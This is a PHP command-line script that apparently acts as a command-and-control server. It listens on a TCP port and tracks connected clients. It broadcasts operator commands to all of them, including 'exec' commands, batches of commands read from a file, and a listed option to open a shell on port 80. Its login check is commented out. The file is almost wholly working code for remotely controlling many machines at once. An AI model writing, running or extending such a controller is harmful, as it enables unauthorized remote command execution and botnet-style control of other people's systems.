#!/usr/bin/php -q
<?php

	set_time_limit(0);
	ob_implicit_flush(1);
	define("DELIMITER", "-------------------------------------");

	include_once 'Timer.php';
	$timer = new Timer();

	$short = "h:p:";
	$long  = array(
		"host:",
		"port:"
	);
	$opts  = getopt($short,$long);

	if(count($opts) < 2){
		die("Assign remote addr. and port..\n");
	}

	/*************************	auth. ****************************/
	//require_once './serverlogin.php';
	//if(!calllogin()) die("Login failed");
	/**********************	end of auth. *************************/

	
	$host_addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
	$host_port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);


	if (($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)	// create
	{
	    echo "\33[91m[!] socket_create() failed: reason: ".socket_strerror(socket_last_error())."\33[0m\n";
	}


	// TODO: more options
	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);


	if (socket_bind($master_sock, $host_addr, (int)$host_port) === false)	// bind
	{
	    echo "\33[91m[!] socket_bind() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
	}
	if (socket_listen($master_sock) === false)	// listen
	{
	    echo "\33[91m[!] socket_listen() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n";
	}
	
	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
	
	$clients 		 = array($master_sock);
	$cstm 	 		 = array();
	$cnt 			 = 0;

	while (true) {
	
	    $loop_timer = new Timer();

	    // create a copy, so $clients doesn't get modified by socket_select()
		$write = $recv = $clients;
		$except = NULL;
		$now = date('H:i:s');

	    if(socket_select($recv, $write, $except, NULL) === false)
	    {
	    	die("\33[91m[!] socket_select() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
	    }
	    if(in_array($master_sock, $recv))
	    {
			if (($clients[] = $recv_sock = socket_accept($master_sock)) === false)
			{
		        die("\33[91m[!] socket_accept() failed: reason: ".socket_strerror(socket_last_error($master_sock))."\33[0m\n");
		    }

			socket_getpeername($recv_sock, $ip, $port);
		    $cstm [] = array("ip" => $ip, "port" => $port);

		    echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";

	        // remove the listening socket from the clients-with-data array
	        $key = array_search($clients, $recv);
	        unset($recv[$key]);

	        continue;
	    }


	    foreach ($recv as $recv_sock)
	    {
	    	socket_getpeername($recv_sock, $ip, $port);
			$now = date('H:i:s');
	        
	        if (($data = @socket_read($recv_sock, 4096, PHP_BINARY_READ)) === false || $data === "")
	        {
	            $key = array_search($recv_sock, $clients);
	            $_key = array_search($port, array_map(function($v){return $v['port'];},$cstm));
	            
	            unset($clients[$key]);
	            unset($recv[$key]);
	            unset($write[$key]);
	            unset($cstm[$_key]); 	// u realnom okruzenju - IP umjesto porta

	            echo "[".$now."] \33[38;5;208mClient ".$ip.":".$port." disconnected.\33[0m\n";
	            continue;
	        }
 
          	$data = trim($data);
    
	        if(!empty($data))
		    	echo "[".$now."] Client [\33[95m".$ip.":".$port."\33[0m]\n".DELIMITER."\n".$data."\n".DELIMITER."\n";

    	   	// $clients minus master socket
	    	// $cstm = array of connected clients (ip:port)
			// $line needs to be flushed => <line="exec"> => avoiding blocks by readline() until result
			// flush $line when data is recieved from all clients

		    if(count($cstm) == count($clients)-1)
		    	$line = "";	
		}


		// cnt > 1 => current client off => infinite loop
		// $line = "exec" until flushed
    	if(@preg_match('/^(exec)\s\w+/', $line) && $cnt < 2)
    	{
    		// skip 1 iteration => avoid block by readline() and read result
    		echo ($cnt < 1) ? "\33[32mExecuting..\33[0m\n" : "\33[91mExecute failed..\33[0m\n";
    		$cnt++;

    		sleep(1);	// wait 1 sec until client/s send callback
    		continue;
    	}
    	else
    	{
			$line = readline(">>> ");
    		readline_add_history($line);
    		$cnt = 0;
    	}
	
		// reading/sending a file of commands
		if(preg_match('/^exec\s(\-f)*\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
		{
			$file = substr($line, 8);

			if(file_exists($file))
			{
				$fp = fopen($file, 'rb');
				$cmdsarr = explode("\n", fread($fp, filesize($file)));
				fclose($fp);

				foreach ($cmdsarr as $cmd)
				{
					$cmd = trim("exec ".$cmd);

					// wait for response
					sleep(0.8);

					foreach ($write as $send_sock)
			  		{
				        if($send_sock == $master_sock)
				            continue;

				        else if(@socket_write($send_sock, $cmd."\n") === false)
				        {	
				        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
				        }	
			    	}
				}

				continue;
			}
			else 
			{
				echo "Invalid path.\n";
				continue;
			}
		}

	    switch ($line) {

	    	case 'clients':
	    		echo "\33[95mClients: ".(count($clients)-1)."\33[0m\n";
	    		print_r($cstm);
	    		break;

	    	case 'exit':
				echo "Closing master socket..\n";
				socket_close($master_sock);	
				exit();

			case 'options':
				echo options();
				break;

	    	default:
	    		break;
	    }


		if(count($clients) === 1)	// only master socket => no clients
		{
			echo "\33[38;5;208mNo connected clients..\33[0m\nListening..\n";
			$line = "";
		}
		if(!empty($cstm) && !empty($write))
		{
		    if(!empty($line) && $line != 'clients'
		    				 && $line != 'exit'
		    				 && $line != 'options'
		    				 && $line != 'shell')	// izbaciti ili doraditi => cheatsheet
		    {
			  	foreach ($write as $send_sock)
			  	{
			        if($send_sock == $master_sock)
			            continue;

			        else if(@socket_write($send_sock, $line."\n") === false)
			        {	
			        	echo "\33[91mWrite error: ".socket_strerror(socket_last_error($send_sock))."\33[0m\n";
			        }	
			    }
			}
		}

    	if($loop_timer->get_execution_time() > 3)
    	{
    		echo "Timer of 3 sec passed\n\n";
    	}
		unset($loop_timer);
	}

	echo "Closing master socket..\n";
	unset($timer);
	socket_close($master_sock);
	exit(0);



	/*******************************************/
	/*******************************************/
	/*******************************************/


	function options(){
		return "<clients>\t\t\t- display connected clients\n<dc>\t\t\t\t- disconnect all clients\n<exit>\t\t\t\t- exit script\n<shell>\t\t\t\t- opens a shell on port 80\n<exec> <cmd>\t\t\t- execute command\n<exec> <-f> <path>\t\t- execute from file\n";
	}
?>